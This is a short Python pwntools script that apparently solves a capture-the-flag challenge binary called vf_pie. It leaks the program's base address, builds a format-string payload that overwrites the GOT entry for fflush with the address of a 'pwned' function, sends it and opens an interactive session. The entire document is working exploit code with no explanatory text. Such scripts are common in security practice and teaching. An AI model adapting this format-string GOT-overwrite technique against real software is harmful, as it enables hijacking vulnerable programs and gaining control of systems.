import vf
from pwn import *

target = process("./vf_pie")
elf = ELF("vf_pie")

leak = target.recvline()
leak = leak.split(b"dreaming: ")[1]
leak = leak.strip(b"\n")
pieBase = int(leak, 16) - elf.symbols["main"]

print("pie base: %s" % hex(pieBase))

fs = vf.WriteFmtStr(value=elf.symbols["pwned"], 
                    address=elf.got["fflush"], 
                    value_base=pieBase, 
                    address_base=pieBase, 
                    offset=6)

fmtStr = fs.generate_fmt_str()

print("try: %s" % str(fmtStr))

target.sendline(fmtStr)
target.interactive()
